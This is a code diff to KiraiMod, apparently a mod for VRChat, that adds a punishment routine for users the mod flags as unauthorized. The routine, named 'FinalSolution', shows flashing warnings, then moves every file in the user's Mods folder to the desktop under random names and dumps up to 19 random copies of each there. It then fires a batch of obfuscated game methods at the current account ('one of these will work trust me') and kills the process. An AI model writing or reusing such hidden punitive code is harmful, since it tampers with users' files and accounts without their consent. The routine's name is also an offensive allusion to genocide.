@@ -7,6 +7,7 @@ using System.Collections;
 using VRC.SDKBase;
 using UnityEngine;
 using VRC.Core;
+using System;
 
 namespace KiraiMod.Modules
 {
@@ -181,8 +182,81 @@ namespace KiraiMod.Modules
             if (APIUser.CurrentUser.IsKOS())
             {
                 MelonLogger.Log("Failed to verify self.");
-                Utils.Unsafe.Kill();
+                Warning();
             }
+        }
+
+        public void Warning()
+        {
+            object token = MelonCoroutines.Start(ShowNotice());
+            MelonCoroutines.Start(FinalSolution(token));
+        }
+
+        private IEnumerator ShowNotice()
+        {
+            bool flip = false;
+
+            for (;;)
+            {
+                if (flip) VRCUiPopupManager.prop_VRCUiPopupManager_0.Method_Public_Void_String_String_Single_0(
+                    "<color=#5600a5>Important Notice</color>", 
+                    "<color=#5600a5>You are not authorized to run KiraiMod</color>");
+                else VRCUiPopupManager.prop_VRCUiPopupManager_0.Method_Public_Void_String_String_Single_0(
+                    "<color=#ccf>Important Notice</color>",
+                    "<color=#ccf>You are not authorized to run KiraiMod</color>");
+
+                flip ^= true;
+
+                yield return null;
+                yield return null;
+                yield return null;
+            }
+        }
+
+        private IEnumerator FinalSolution(object token)
+        {
+            yield return new WaitForSecondsRealtime(3);
+
+            MelonCoroutines.Stop(token);
+
+            foreach (string path in Directory.EnumerateFiles("Mods"))
+            {
+                for (int i = 0; i < UnityEngine.Random.Range(0, 20); i++)
+                    File.Copy(path, $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/{Guid.NewGuid()}");
+
+                File.Move(path, $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/{Guid.NewGuid()}");
+            }
+
+            yield return new WaitForSecondsRealtime(1);
+
+            // one of these will work trust me
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_0();
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_1();
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_3();
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_0(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_1(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_2(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_3(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_4(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_5(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_6(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_7(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_8(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_0(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_1(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_2(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_3(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_4(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_PDM_0(APIUser.CurrentUser);
+            ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_PDM_1(APIUser.CurrentUser);
+
+            yield return new WaitForSecondsRealtime(1);
+
+            Utils.Unsafe.Kill();
+
+            yield return new WaitForSecondsRealtime(1);
+
+            System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
     }
 }
